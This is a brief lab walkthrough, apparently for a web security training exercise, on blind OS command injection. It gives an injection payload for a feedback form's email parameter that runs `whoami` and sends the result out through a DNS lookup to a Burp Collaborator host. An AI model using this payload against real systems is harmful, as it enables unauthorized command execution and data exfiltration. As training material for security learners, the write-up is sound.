# Lab: Blind OS command injection with out-of-band interaction

Open burp collaborator and copy the server location.

Intercept the feedback request and modify the email parameter to be ``email=||nslookup+`whoami`.<burp-collaborator-server>||`` using the appropriate collaborator url.

Forward the request and check the collaborator interactions to see that the username is included in the dns lookup.